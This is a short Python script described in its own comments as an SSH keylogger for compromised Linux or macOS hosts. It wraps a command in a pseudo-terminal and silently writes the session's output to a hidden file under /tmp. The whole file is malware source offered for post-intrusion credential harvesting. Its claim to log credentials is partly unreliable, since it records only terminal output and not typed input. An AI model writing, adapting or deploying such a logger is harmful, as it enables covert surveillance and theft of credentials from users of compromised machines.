#!/usr/bin/env python3
import os
import pty
import select
import sys

# A simple SSH keylogger that intercepts SSH sessions and logs credentials.
# This is for use on a compromised Linux/macOS host.

LOG_FILE = "/tmp/.ssh_logs.txt"

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <command> [args...]")
        sys.exit(1)

    pid, fd = pty.fork()

    if pid == 0: # Child process
        os.execvp(sys.argv[1], sys.argv[1:])
    else: # Parent process
        with open(LOG_FILE, "ab") as log_file:
            while True:
                try:
                    r, _, _ = select.select([sys.stdin, fd], [], [])
                    if sys.stdin in r:
                        data = os.read(sys.stdin.fileno(), 1024)
                        os.write(fd, data)
                    if fd in r:
                        data = os.read(fd, 1024)
                        if not data:
                            break
                        os.write(sys.stdout.fileno(), data)
                        log_file.write(data)
                        log_file.flush()
                except OSError:
                    break

if __name__ == "__main__":
    main()
